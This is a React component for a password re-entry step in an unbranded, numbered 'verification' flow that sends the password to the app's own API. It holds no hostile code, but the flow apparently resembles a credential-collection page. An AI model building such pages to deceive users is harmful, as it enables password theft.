import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { LoadingOverlay } from "@/components/loading-overlay";
import { ProgressIndicator } from "@/components/progress-indicator";
import {
  passwordVerificationSchema,
  PasswordVerification,
} from "@shared/schema";
import { useToast } from "@/hooks/use-toast";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";

export function PasswordVerify() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);

  const form = useForm<PasswordVerification>({
    resolver: zodResolver(passwordVerificationSchema),
    defaultValues: {
      password: "",
    },
  });

  const submitMutation = useMutation({
    mutationFn: async (data: PasswordVerification) => {
      // No localStorage, just send the form data
      const response = await apiRequest("/api/verification/password", {
        method: "POST",
        body: JSON.stringify(data),
      });
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Password Verified",
        description: "Password verification successful. Proceeding to next step.",
      });
      navigate("/verified5");
    },
    onError: (error) => {
      toast({
        title: "Verification Failed",
        description:
          error instanceof Error ? error.message : "Please try again.",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: PasswordVerification) => {
    submitMutation.mutate(data);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-white py-12 px-4">
      <LoadingOverlay
        isVisible={submitMutation.isPending}
        message="Verifying Password"
      />

      <div className="max-w-md mx-auto">
        <ProgressIndicator currentPath="/password-verify" />

        <div className="bg-white rounded-2xl shadow-soft p-8 mt-8">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg
                className="w-8 h-8 text-white"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                />
              </svg>
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">
              Password Verification
            </h2>
            <p className="text-gray-600">
              Please re-enter your password to verify your identity
            </p>
          </div>

          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <div className="space-y-2">
              <Label
                htmlFor="password"
                className="text-sm font-medium text-gray-700"
              >
                <svg
                  className="w-4 h-4 inline mr-2"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
                Password
              </Label>
              <Input
                id="password"
                type="password"
                {...form.register("password")}
                placeholder="Enter your password"
                className="h-12 rounded-xl border-gray-300 focus:border-blue-600 focus:ring-blue-600"
              />
              {form.formState.errors.password && (
                <p className="text-sm text-red-600">
                  {form.formState.errors.password.message}
                </p>
              )}
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
              <div className="flex items-start space-x-3">
                <svg
                  className="w-5 h-5 text-blue-600 mt-0.5"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
                <div>
                  <h4 className="font-medium text-gray-900 text-sm">
                    Security Check
                  </h4>
                  <p className="text-xs text-gray-600 mt-1">
                    This additional step helps ensure your account security
                    during the verification process.
                  </p>
                </div>
              </div>
            </div>

            <Button
              type="submit"
              className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-xl shadow-lg transition-all duration-200 transform hover:scale-105"
              disabled={submitMutation.isPending}
            >
              {submitMutation.isPending ? "Verifying..." : "Verify Password"}
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
}
